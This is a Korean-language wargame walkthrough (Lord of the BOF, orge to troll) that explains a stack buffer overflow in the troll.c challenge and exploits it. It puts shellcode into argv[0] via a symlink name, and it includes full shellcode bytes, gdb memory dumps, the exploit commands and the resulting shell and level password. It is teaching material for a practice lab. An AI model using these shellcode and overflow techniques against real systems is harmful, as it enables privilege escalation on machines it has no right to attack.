Orge to Troll

**Troll.c**

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```
소스코드를 해석해보면 일단 argc 조건이 달라졌습니다. argc가 2개가 아니면 프로그램을 종료 시킵니다. 즉 메인에 인자값 하나를 무조건 주어야 합니다. <br>
다음은 argv hunter입니다. argv[1]에 있는 값을 전부 0으로 초기화 시킵니다. <br>
소스코드에 주석으로 어느 부분이 바뀌고 어느 부분이 추가되었는 지 친절하게 표시되어있기 때문에 주석을 보시면 훨씬 쉽게 이해할 수 있습니다.

argv[1] 말고 다른 인자 값을 줄 수 없고 유일하게 입력할 수 있는 argv[1]도 초기화가 되서 사용할 수 없습니다. 그래서 저는 argv[0]을 이용하여 공격하도록 하겠습니다. argv[0]에는 쉘에서 프로그램을 실행시킬 때, 입력한 명령어가 들어 있습니다. 따라서 파일에 심볼릭 링크를 걸고 심볼릭 링크이름에 쉘코드를 넣어서 argv[0]에 쉘코드를 삽입할 수 있습니다.

```
[orge@localhost temp]$ ln -s troll `python -c 'print "hack" + "\x90"*100 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
[orge@localhost temp]$ ls
hack????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵󪀨쀿ÿ2i00tii0cjo?㐔?࿱?̿  troll
```
ln -s 원본파일 링크파일<br>
이렇게 링크파일을 만들 수 있습니다. 쉘코드와 \x90부분의 파일이름이 ???와 이상한 문자로 이루어져있기 때문에 젤 앞에 hack처럼 쉽게 자동완성 시킬 수 있게 해줍시다.

아스키 코드표에서 \x2f는 '/'입니다. 따라서 쉘코드에 \x2f가 들어 있으면 디렉토리 표시로 인식되어 심볼릭 링크에서 오류가 일어 납니다. 따라서 조금 다른 쉘코드를 사용하였습니다.
**사용한 쉘코드**
```
\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```

**'\x2f'가 들어간 쉘코드를 사용했을 때 나타나는 오류**
```
[orge@localhost temp]$ ln -s troll `python -c 'print "h@ck" + "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
ln: cannot create symbolic link `h@ck101̀Iq0F̀1󿿐h//shh/bin⏓󿲒°
                                                           ̀' to `troll': No such file or directory
```


```
[orge@localhost temp]$ gdb -q hackꝑ^1ɱ2l^Nÿ^A蝁u󪝅髿ÿÿ2i00tii0cjo㐔⚱^L΁ 
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],2
                ~~~ 생략 ~~~
0x80485e0 <main+224>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485e3 <main+227>:	add    %eax,4
0x80485e6 <main+230>:	mov    %edx,DWORD PTR [%eax]
0x80485e8 <main+232>:	push   %edx
0x80485e9 <main+233>:	lea    %eax,[%ebp-40]
0x80485ec <main+236>:	push   %eax
0x80485ed <main+237>:	call   0x8048440 <strcpy>
                ~~~ 생략 ~~~
0x804863d <main+317>:	leave  
0x804863e <main+318>:	ret    
0x804863f <main+319>:	nop    
End of assembler dump.
(gdb) b*main+237
Breakpoint 1 at 0x80485ed
```
strcpy 함수 부분에 break 를 걸어 줍니다.

>>> buffer[40] + SFP[4] + RET[4]

```
(gdb) x/100x $esp
0xbffff974:	0xbffff980	0xbffffb93	0x00000017	0xbffff9a8
0xbffff984:	0x4000a970	0x400f855b	0x080496fc	0x4000ae60
0xbffff994:	0xbffff9f4	0xbffff9a8	0x080484eb	0x080496e8
0xbffff9a4:	0x080496fc	0xbffff9c8	0x400309cb	0x00000002
0xbffff9b4:	0xbffff9f4	0xbffffa00	0x40013868	0x00000002
0xbffff9c4:	0x08048450	0x00000000	0x08048471	0x08048500
0xbffff9d4:	0x00000002	0xbffff9f4	0x08048390	0x0804866c
0xbffff9e4:	0x4000ae60	0xbffff9ec	0x40013e90	0x00000002
0xbffff9f4:	0xbffffaea	0xbffffb93	0x00000000	0xbffffbc4
0xbffffa04:	0xbffffbe6	0xbffffbf0	0xbffffbfe	0xbffffc1d
0xbffffa14:	0xbffffc2a	0xbffffc41	0xbffffc5b	0xbffffc7a
0xbffffa24:	0xbffffc85	0xbffffc93	0xbffffcd3	0xbffffce5
0xbffffa34:	0xbffffcf5	0xbffffd0a	0xbffffd1a	0xbffffd24
0xbffffa44:	0xbffffd40	0xbffffd58	0xbffffd63	0xbffffd74
0xbffffa54:	0xbffffd88	0xbffffd90	0x00000000	0x00000003
0xbffffa64:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffa74:	0x00000006	0x00000006	0x00001000	0x00000007
0xbffffa84:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffffa94:	0x08048450	0x0000000b	0x000001fb	0x0000000c
0xbffffaa4:	0x000001fb	0x0000000d	0x000001fb	0x0000000e
0xbffffab4:	0x000001fb	0x00000010	0x0fabfbff	0x0000000f
0xbffffac4:	0xbffffae5	0x00000000	0x00000000	0x00000000
0xbffffad4:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffae4:	0x38366900	0x682f0036	0x2f656d6f	0x6567726f
0xbffffaf4:	0x6d65742f	0x61682f70	0x90906b63	0x90909090
0xbffffb04:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb14:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb24:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb34:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb44:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb54:	0x90909090	0x90909090	0x90909090	0x11eb9090
0xbffffb64:	0xb1c9315e	0x0e6c8032	0xe98001ff	0xebf67501
```

```
 [orge@localhost temp]$ ./hack????????????????????????????????????????????????????????????????????????????????????????????????????龞1ɱ2?l?ÿ??羵󪀨쀿ÿ2i00tii0cjo?㐔?࿱? `python -c 'print "A"*44 + "\x24\xfb\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$
Segmentation fault (core dumped)
```
xshell 상에서 명령어가 한 줄이 넘어가면서 명령어가 지워지면서 입력되는 현상이 있을 수 있으나 그냥 무시하고 입력하면 명령어가 입력이 됩니다.
그나저나 0xbffffb24주소로 공격하여 코어 덤프가 떴으니 다시 코어 파일을 분석해 보겠습니다.

```
(gdb) x/1000x $esp
0xbffff920:	0x00000000	0xbffff964	0xbffff970	0x40013868
0xbffff930:	0x00000002	0x08048450	0x00000000	0x08048471
0xbffff940:	0x08048500	0x00000002	0xbffff964	0x08048390
0xbffff950:	0x0804866c	0x4000ae60	0xbffff95c	0x40013e90
0xbffff960:	0x00000002	0xbffffa69	0xbffffb04	0x00000000
0xbffff970:	0xbffffb35	0xbffffb49	0xbffffb60	0xbffffb7f
0xbffff980:	0xbffffba1	0xbffffbab	0xbffffd6e	0xbffffd8d
0xbffff990:	0xbffffda7	0xbffffdbc	0xbffffdd8	0xbffffde3
0xbffff9a0:	0xbffffdfb	0xbffffe08	0xbffffe10	0xbffffe1a
0xbffff9b0:	0xbffffe2a	0xbffffe38	0xbffffe46	0xbffffe57
0xbffff9c0:	0xbffffe62	0xbffffe72	0xbffffeb2	0xbfffff4f
0xbffff9d0:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffff9e0:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffff9f0:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffa00:	0x00000000	0x00000009	0x08048450	0x0000000b
0xbffffa10:	0x000001fb	0x0000000c	0x000001fb	0x0000000d
0xbffffa20:	0x000001fb	0x0000000e	0x000001fb	0x00000010
0xbffffa30:	0x0fabfbff	0x0000000f	0xbffffa64	0x00000000
0xbffffa40:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffa50:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffa60:	0x00000000	0x36383669	0x682f2e00	0x906b6361
0xbffffa70:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa80:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa90:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaa0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffab0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffac0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffad0:	0xeb909090	0xc9315e11	0x6c8032b1	0x8001ff0e
0xbffffae0:	0xf67501e9	0xeae805eb	0x32ffffff	0x306951c1
0xbffffaf0:	0x69697430	0x6f6a6330	0x5451e48a	0xb19ae28a
0xbffffb00:	0x0081ce0c	0x00000078	0x00000000	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000000	0x00000000
```

```
 -c 'print "A"*44 + "\xa0\xfa\xff\xbf"'`/hackꝑ^1ɱ2l^Nÿ^A蝁u󪝅髿ÿÿ2i00tii0cjo㐔⚱^L΁ `python 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
bash$ 
```
xshell 상에서 이렇게 표시될 수도 있습니다. 

```
[orge@localhost orge]$ ln -s troll `python -c 'print "hack" + "\x90"*100 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x3 -c 'print "A"*44 + "\xa0\xfa\xff\xbf"'`蝁u󪝅髿ÿÿ2i00tii0cjo㐔⚱^L΁ `python 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
bash$ my-pass
euid = 508
aspirin
```

공격에 성공한 것을 볼 수 있습니다.